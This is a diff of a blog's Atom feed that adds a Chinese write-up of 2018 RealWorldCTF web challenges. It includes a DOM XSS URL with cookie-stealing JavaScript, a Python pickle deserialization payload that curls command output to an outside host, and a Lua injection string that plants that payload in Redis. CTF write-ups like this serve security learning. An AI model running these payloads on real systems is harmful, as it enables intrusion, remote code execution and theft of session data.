@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.codemonster.cn/"/>
-  <updated>2018-07-28T06:19:57.184Z</updated>
+  <updated>2018-07-31T05:13:18.237Z</updated>
   <id>https://www.codemonster.cn/</id>
   
   <author>
@@ -14,6 +14,62 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2018 RWCTF web WriteUp</title>
+    <link href="https://www.codemonster.cn/2018/07/30/2018-rwctf-web-writeup/"/>
+    <id>https://www.codemonster.cn/2018/07/30/2018-rwctf-web-writeup/</id>
+    <published>2018-07-30T14:11:58.000Z</published>
+    <updated>2018-07-31T05:13:18.237Z</updated>
+    
+    <content type="html"><![CDATA[<p>周末打了长亭举办的RealWorldCTF，tql，写一下web的wp给博客除除草。  </p>
+<a id="more"></a>
+<h1 id="dot-free"><a href="#dot-free" class="headerlink" title="dot free"></a>dot free</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">All the IP addresses and domain names have dots, but can you hack without dot?</div></pre></td></tr></table></figure>
+<p>主页有个提交url的框，尝试提交自己的url，但是打不到，怀疑限制了ip，测试中发现网站是是django，并且开启了debug模式，提交错误的post参数就可以看到报错信息<br><img src="/img/2018-rwctf-img8.png" alt=""></p>
+<p>可以看到web站点的名字叫 XSSWebSite，于是找xss的点，尝试查找django的xss，但是最新版本并没有已知的xss漏洞，后面发现主页存在这样一段js代码，看起来是个domxss<br><img src="/img/2018-rwctf-img9.png" alt=""></p>
+<p>调试一下，可以知道这段代码从浏览器的url取了查询字符串，urldecode后格式化为json，然后发送到一个监听器里去操作，代码里过滤了value参数不能出现<code>.</code>，<code>//</code>和<code>。</code>，type不为iframe的时候会将value插入到一个script标签中<br>看到这里和题目提示对应上了，不能出现<code>.</code>，最后构造payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://13.57.104.34/?&#123;%22iframe%22:&#123;%22value%22:%22http:/\\111111111%22,%22type%22:%22xxxx%22&#125;&#125;</div></pre></td></tr></table></figure></p>
+<p>11111111替换为自己的vps的ip转10进制，可以看到页面里已经出现一个src=11111111的script标签了<br><img src="/img/2018-rwctf-img11.png" alt=""></p>
+<p>然后提交这个url到Recieve，服务端就会执行vps上提前构造好的js语句了<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.location.href=<span class="string">"http://xxxxxxx/?="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</div></pre></td></tr></table></figure></p>
+<p>最后flag在cookie里<br><img src="/img/2018-rwctf-img10.png" alt=""><br>flag:  rwctf{L00kI5TheFlo9}</p>
+<h1 id="bookhub"><a href="#bookhub" class="headerlink" title="bookhub"></a>bookhub</h1><p>题目提示www.zip，可以下载到源码<br>看到代码里登陆的时候会检查ip白名单，这里的ip是取的xff，不在白名单内会提示ip不在白名单内<br><img src="/img/2018-rwctf-img12.png" alt=""><br>修改xff为白名单ip失败，猜测xff获取到的是nginx转发过去的ip，所以想到从上面这串里的唯一一个外网ip 18.213.16.123入手<br>扫描该ip，发现5000端口也开了一个相同的应用程序bookhub，并且开启了debug模式，在这里登陆的提示是密码错误，说明已经绕过了白名单检查。</p>
+<p>审计代码发现有一处鉴权的装饰器使用错误(route和login_required顺序反了)<br><img src="/img/2018-rwctf-img4.png" alt=""><br>这会导致鉴权装饰器无效，没有登陆的用户也能调用该接口（debug模式下<br>查看接口代码，可以知道这个接口eval了lua脚本，用来清除除了自己之外其他所有人的session，其中sessionid存在拼接操作，并且可控，想到可以注入点东西<br><img src="/img/2018-rwctf-img5.png" alt=""><br>参考 <a href="https://www.ctolib.com/topics-129777.html" target="_blank" rel="noopener">https://www.ctolib.com/topics-129777.html</a><br>通过这个接口，将恶意的数据（cPickle反序列化漏洞的payload）注入到redis中，当鉴权的时候就会反序列化该字符串，就能任意命令执行了，但是因为该接口需要csrf_token校验，所以多一步获取token的操作<br>具体操作如下：<br>1.生成payload：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> cPickle</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        s = <span class="string">"""curl http://xxxx.ceye.io/`/readflag|base64`"""</span></div><div class="line">        <span class="keyword">return</span> os.system, (s,)</div><div class="line"></div><div class="line">evil = cPickle.dumps(genpoc())</div><div class="line"><span class="keyword">print</span> evil.replace(<span class="string">"\n"</span>,<span class="string">"\\n"</span>)</div></pre></td></tr></table></figure></p>
+<p>2.构造恶意的sessionid并访问/login/获取csrf_token：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bookhub-session=aaa<span class="string">"&#125; redis.call("</span>set<span class="string">","</span>bookhub:session:aaa<span class="string">","</span>cposix\nsystem\np1\n(S<span class="string">'curl http://xxxxxxx.ceye.io/`/readflag|base64`'</span>\np2\ntRp3\n.<span class="string">")--;</span></div></pre></td></tr></table></figure></p>
+<p>这里拼接进lua脚本后长这样：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">local</span> inputs = &#123;<span class="string">"bookhub:session:aaa"</span>&#125;</div><div class="line">redis.call(<span class="string">"set"</span>,<span class="string">"bookhub:session:aaa"</span>,<span class="string">"cposix\nsystem\np1\n(S'curl http://xxxxxxx.ceye.io/`/readflag|base64`'\np2\ntRp3\n."</span>)<span class="comment">--;</span></div></pre></td></tr></table></figure></p>
+<p>到时候脚本运行后就会将恶意数据写入<code>aaa</code>这个session-id的value里，并且删除其他除了aaa意外的session<br><img src="/img/2018-rwctf-img6.png" alt=""><br>3.带着2中生成的ssrf_token和恶意的session-id去请求 /admin/system/refresh_session<br>postdata： submit=1&amp;ssrf_token=<br>导致lua代码注入修改我们的目标session-id的value值, 最后用<code>aaa</code>这个session-id任意访问一个需要session的页面即可触发反序列化漏洞执行命令<br>最后用ceye外带出flag<br><img src="/img/2018-rwctf-img13.png" alt=""></p>
+<h1 id="Print-MD"><a href="#Print-MD" class="headerlink" title="Print-MD"></a>Print-MD</h1><p>Print-MD这道题比赛过程中没做出来，比赛结束忙着上班，wp还没写完，先写一下思路<br>想看wp的可以去蓝猫师傅的博客膜一下 <a href="https://blog.cal1.cn/post/RealWorldCTF%20PrintMD%20writeup" target="_blank" rel="noopener">RealWorldCTF PrintMD writeup</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">PrintMD</div><div class="line">Paste your HackMD link to get a printer-friendly version!</div><div class="line">The note should neither be Protected nor Private.</div><div class="line">Press Ctrl + P to print or save as PDF.</div><div class="line">PrintMD is compatible with outdated browsers.</div><div class="line">If the link is published version of the note, which contains /s/, you can append /edit to get the original link. e.g., https://hackmd.io/s/HyCFXNkNm/edit</div><div class="line">‍flag is in /flag</div></pre></td></tr></table></figure></p>
+<p><code>print?url=</code>可以提交一个hackmd的链接并将md文档解析为html，但是限制了只能读取<code>https://hackmd.io/</code>开头的url，故无法ssrf  </p>
+<p>第一个hint提示 兼容低版本浏览器，其实之前就有发现在我本机<code>不同浏览器</code>访问print接口会有不同的效果：</p>
+<ol>
+<li>chrome请求该接口，返回的标题是 <code>请稍后</code>，然后浏览器再往外发请求获取hackmd的md内容，然后解析成html展示到页面上  </li>
+<li>firefox请求接口，返回的是已经解析好的html标签，很明显后端做了请求并解析md为html的工作</li>
+</ol>
+<p>猜测print接口应该是校验了user-agent，于是测试了一下chrome的ua，发现66.0是个分水岭，然而并没有啥进展<br><img src="/img/2018-rwctf-img1.png" alt=""><br><img src="/img/2018-rwctf-img2.png" alt=""></p>
+<p>后面查看前端代码里的 print.ba84889093b992d33112.js<br>发现这样一段代码<br><img src="/img/2018-rwctf-img3.png" alt=""><br>可以看到这个应该就是print接口的核心代码了，接受到url参数，判断是否为hackmd的url，然后在url最后如果不是/download就拼接一个/download进去，<br>因为hackmd.io/xxxxxxx/download 是可以下载markdown格式的文件的，<br>然后将ua和url传入 <code>/api/render/</code> 接口，因为这个接口外部没有权限访问（访问会403），而且不知道这个接口调用了啥库，所以陷入了僵局</p>
+<p>hint2 给了render.js的代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> &#123;Router&#125; = <span class="built_in">require</span>(<span class="string">'express'</span>)</div><div class="line"><span class="keyword">const</span> &#123;matchesUA&#125; = <span class="built_in">require</span>(<span class="string">'browserslist-useragent'</span>)</div><div class="line"><span class="keyword">const</span> router = Router()</div><div class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</div><div class="line"><span class="keyword">const</span> md = <span class="built_in">require</span>(<span class="string">'../../plugins/md_srv'</span>)</div><div class="line"></div><div class="line">router.post(<span class="string">'/render'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">  <span class="keyword">let</span> ret = &#123;&#125;</div><div class="line">  ret.ssr = !matchesUA(req.body.ua, &#123;</div><div class="line">    browsers: [<span class="string">"last 1 version"</span>, <span class="string">"&gt; 1%"</span>, <span class="string">"IE 10"</span>],</div><div class="line">    _allowHigherVersions: <span class="literal">true</span></div><div class="line">  &#125;);</div><div class="line">  <span class="keyword">if</span> (ret.ssr) &#123;</div><div class="line">    axios(req.body.url).then(<span class="function"><span class="params">r</span> =&gt;</span> &#123;</div><div class="line">          ret.mdbody = md.render(r.data)</div><div class="line">      res.json(ret)</div><div class="line">    &#125;)</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    ret.mdbody = md.render(<span class="string">'# 请稍候…'</span>)</div><div class="line">    res.json(ret)</div><div class="line">  &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = router</div></pre></td></tr></table></figure></p>
+<p>可以看到我们可控的地方有三个点，分别对应三个库：</p>
+<ol>
+<li>ua: 对应<code>browserslist-useragent</code>库，主要是用来判断当前ua版本是否符合预期版本，感觉问题不大</li>
+<li>url: 对应<code>axios</code>库，当ua版本被判定为低版本时，会用axios对url发送一个get请求，但是url限制死了只能 <code>https://hackmd.io/</code>，所以能利用的地方有限</li>
+<li>r.data: url返回的内容，然后用<code>../../plugins/md_srv</code>这个库进行了解析，不知道这个库是啥情况</li>
+</ol>
+<p>比赛过程中到这里又陷入了僵局，赛后问了蓝猫师傅才知道利用点在axios这边</p>
+<p>未完待续。。。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;周末打了长亭举办的RealWorldCTF，tql，写一下web的wp给博客除除草。  &lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
+    
+      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="WEB" scheme="https://www.codemonster.cn/tags/WEB/"/>
+    
+  </entry>
   
   <entry>
     <title>2018 信息安全铁人三项赛第七(福建)赛区 WriteUp</title>
@@ -46,11 +102,11 @@
     </summary>
     
     
+      <category term="渗透" scheme="https://www.codemonster.cn/tags/%E6%B8%97%E9%80%8F/"/>
+    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
     
       <category term="流量分析" scheme="https://www.codemonster.cn/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
-    
-      <category term="渗透" scheme="https://www.codemonster.cn/tags/%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
@@ -386,9 +442,9 @@
     
       <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
     
-      <category term="AWD" scheme="https://www.codemonster.cn/tags/AWD/"/>
-    
       <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
+    
+      <category term="AWD" scheme="https://www.codemonster.cn/tags/AWD/"/>
     
   </entry>
   
@@ -740,13 +796,13 @@
     
       <category term="php" scheme="https://www.codemonster.cn/tags/php/"/>
     
+      <category term="文件包含" scheme="https://www.codemonster.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    
       <category term="SQL注入" scheme="https://www.codemonster.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
       <category term="上传" scheme="https://www.codemonster.cn/tags/%E4%B8%8A%E4%BC%A0/"/>
     
       <category term="反序列化" scheme="https://www.codemonster.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
-      <category term="文件包含" scheme="https://www.codemonster.cn/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
     
       <category term="盲注" scheme="https://www.codemonster.cn/tags/%E7%9B%B2%E6%B3%A8/"/>
     
@@ -946,33 +1002,6 @@
       <category term="Web" scheme="https://www.codemonster.cn/tags/Web/"/>
     
       <category term="Crypto" scheme="https://www.codemonster.cn/tags/Crypto/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>汉诺塔问题（python版）</title>
-    <link href="https://www.codemonster.cn/2017/04/30/python-tower-of-hanoi-problem/"/>
-    <id>https://www.codemonster.cn/2017/04/30/python-tower-of-hanoi-problem/</id>
-    <published>2017-04-30T10:14:40.000Z</published>
-    <updated>2018-05-04T07:47:50.016Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>将n个盘子从初塔A移动到目的塔C，借用塔B<br><a id="more"></a></p>
-<h2 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h2><p>一次只能移动一个盘子，大盘子不能放在小盘子上方</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>递归实现<br>编写<code>move(n, a, b, c)</code>函数，参数<code>n</code>表示3个柱子A、B、C中第1个柱子A的盘子数量<br>要将A的n个盘子移动到C，就要先将上面的n-1个盘子移动到B，最底下的大盘子才能移动到C<br>然后再将B的n-1个盘子借助A移动到C</p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="comment">#def normalize(name):</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span><span class="params">(n, a, b, c)</span>:</span></div><div class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'%s--&amp;gt;%s'</span> %(a,c)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        move(n<span class="number">-1</span>,a,c,b)</div><div class="line">        <span class="keyword">print</span> <span class="string">'%s--&amp;gt;%s'</span> %(a,c)</div><div class="line">        move(n<span class="number">-1</span>,b,a,c)</div><div class="line">move(<span class="number">3</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>)</div></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;目的&quot;&gt;&lt;a href=&quot;#目的&quot; class=&quot;headerlink&quot; title=&quot;目的&quot;&gt;&lt;/a&gt;目的&lt;/h2&gt;&lt;p&gt;将n个盘子从初塔A移动到目的塔C，借用塔B&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="python" scheme="https://www.codemonster.cn/tags/python/"/>
-    
-      <category term="算法" scheme="https://www.codemonster.cn/tags/%E7%AE%97%E6%B3%95/"/>
-    
-      <category term="递归" scheme="https://www.codemonster.cn/tags/%E9%80%92%E5%BD%92/"/>
     
   </entry>
   
